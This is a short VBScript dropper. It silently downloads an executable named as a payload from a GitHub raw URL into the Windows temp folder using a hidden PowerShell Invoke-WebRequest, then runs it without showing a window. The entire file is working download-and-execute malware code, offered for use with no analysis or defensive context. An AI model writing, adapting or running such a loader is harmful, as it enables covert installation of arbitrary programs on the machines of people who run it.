Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' ✅ URL to your GitHub-hosted EXE
url = "https://github.com/theredbruno/Service/raw/refs/heads/main/CE636682.exe"

' ✅ Path to save EXE
exePath = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.exe"

' ✅ Download EXE silently
cmd = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & exePath & "' -UseBasicParsing -ErrorAction Stop"""
shell.Run cmd, 0, True

' ✅ Execute EXE silently (no CMD window)
shell.Run """" & exePath & """", 0, False
